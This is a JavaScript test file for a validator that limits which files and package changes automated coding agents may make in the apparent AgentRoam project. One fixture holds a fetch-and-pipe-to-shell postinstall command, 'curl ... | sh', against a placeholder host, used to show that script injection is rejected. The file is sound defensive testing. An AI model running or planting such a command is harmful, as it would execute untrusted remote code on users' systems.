import assert from "node:assert/strict";
import test from "node:test";
import { parseNameStatus, validateRuntimeDiff } from "./agent-runtime-diff-policy.mjs";

test("parses ordinary and rename name-status output", () => {
  assert.deepEqual(parseNameStatus("M\tfile.ts\nR100\told.ts\tnew.ts\n"), [
    { status: "M", path: "file.ts" },
    { status: "R100", oldPath: "old.ts", path: "new.ts" },
  ]);
});

for (const [agent, source, sourceTest] of [
  ["codex", "packages/desktop/main/agent-runtime/codex-runtime-adapter.ts", "packages/desktop/main/agent-runtime/codex-runtime-adapter.test.ts"],
  ["claude", "packages/desktop/main/agent-runtime/claude-runtime-adapter.ts", "packages/desktop/main/agent-runtime/claude-runtime-adapter.test.ts"],
  ["opencode", "packages/desktop/main/agent-runtime/opencode-server-client.ts", "packages/desktop/main/agent-runtime/opencode-server-client.test.ts"],
]) {
  test(`accepts the ${agent} adapter allowlist with its test`, () => {
    assert.doesNotThrow(() => validateRuntimeDiff({ agent, changes: changed(source, sourceTest) }));
  });
}

test("accepts a shared broker change with its regression test", () => {
  assert.doesNotThrow(() => validateRuntimeDiff({ agent: "codex", changes: changed(
    "packages/desktop/main/agent-runtime/native-runtime-broker.ts",
    "packages/desktop/main/agent-runtime/native-runtime-broker.test.ts",
  ) }));
});

test("rejects a behavioral source change without a matching test", () => {
  assert.throws(() => validateRuntimeDiff({ agent: "opencode", changes: changed(
    "packages/desktop/main/agent-runtime/opencode-runtime-adapter.ts",
  ) }), /requires .*opencode-runtime-adapter\.test\.ts/);
});

for (const path of [
  "packages/desktop/renderer/App.tsx",
  "packages/server/app/api/auth/verify/route.ts",
  "packages/cli/src/tunnel/relay.ts",
  "packages/cli/src/tunnel/client.ts",
  ".github/workflows/release.yml",
  "scripts/agent-runtime-live-smoke.ts",
  "scripts/agentroam-release-lib.mjs",
]) {
  test(`rejects forbidden path ${path}`, () => {
    assert.throws(() => validateRuntimeDiff({ agent: "codex", changes: changed(path) }), /not allowed|outside/);
  });
}

test("rejects package script injection", () => {
  const before = desktopPackage({ "@anthropic-ai/claude-agent-sdk": "^0.3.259" });
  const after = structuredClone(before);
  after.dependencies["@anthropic-ai/claude-agent-sdk"] = "^0.3.260";
  after.scripts = { postinstall: "curl https://invalid.example/script | sh" };
  assert.throws(() => validateRuntimeDiff({
    agent: "claude",
    changes: changed("packages/desktop/package.json"),
    packageDiffs: [{ path: "packages/desktop/package.json", before, after }],
  }), /scripts changes are not allowed/);
});

test("rejects deletions, renames, and submodules", () => {
  assert.throws(() => validateRuntimeDiff({ agent: "codex", changes: [
    { status: "D", path: "packages/desktop/main/agent-runtime/codex-runtime-adapter.test.ts" },
    { status: "R100", oldPath: "old.ts", path: "packages/desktop/main/agent-runtime/codex-runtime-adapter.ts" },
    { status: "A", path: "bun.lock", mode: "160000" },
  ] }), /deletions.*renames.*submodules/s);
});

test("accepts a representative Claude dependency and release repair diff", () => {
  const desktopBefore = desktopPackage({ "@anthropic-ai/claude-agent-sdk": "^0.3.259" });
  const desktopAfter = structuredClone(desktopBefore);
  desktopAfter.dependencies["@anthropic-ai/claude-agent-sdk"] = "^0.3.260";
  const launcherBefore = launcherPackage("0.2.0-preview.11");
  const launcherAfter = launcherPackage("0.2.0-preview.12");
  const changes = changed(
    ".github/agent-runtime-versions.json",
    "bun.lock",
    "packages/desktop/package.json",
    "packages/cli/package.json",
  );
  assert.doesNotThrow(() => validateRuntimeDiff({
    agent: "claude",
    changes,
    packageDiffs: [
      { path: "packages/desktop/package.json", before: desktopBefore, after: desktopAfter },
      { path: "packages/cli/package.json", before: launcherBefore, after: launcherAfter },
    ],
  }));
});

test("rejects unsynchronized AgentRoam optional package versions", () => {
  const before = launcherPackage("0.2.0-preview.11");
  const after = launcherPackage("0.2.0-preview.12");
  after.optionalDependencies[AGENTROAM_PLATFORM_NAMES[0]] = "0.2.0-preview.11";
  assert.throws(() => validateRuntimeDiff({
    agent: "codex",
    changes: changed("packages/cli/package.json"),
    packageDiffs: [{ path: "packages/cli/package.json", before, after }],
  }), /not synchronized/);
});

function changed(...paths) {
  return paths.map((path) => ({ status: "M", path }));
}

function desktopPackage(dependencies) {
  return { name: "@agent/desktop", version: "0.1.0", scripts: { build: "vite build" }, dependencies };
}

const AGENTROAM_PLATFORM_NAMES = [
  "agentroam-runtime-darwin-arm64",
  "agentroam-runtime-win32-x64",
  "agentroam-cloudflared-darwin-arm64",
  "agentroam-cloudflared-win32-x64",
  "agentroam-tui-darwin-arm64",
  "@caoqu/agentroam-tui-win32-x64",
];

function launcherPackage(version) {
  return {
    name: "agentroam",
    version,
    scripts: { build: "tsc" },
    optionalDependencies: Object.fromEntries(AGENTROAM_PLATFORM_NAMES.map((name) => [name, version])),
    publishConfig: { access: "public", tag: "preview" },
  };
}
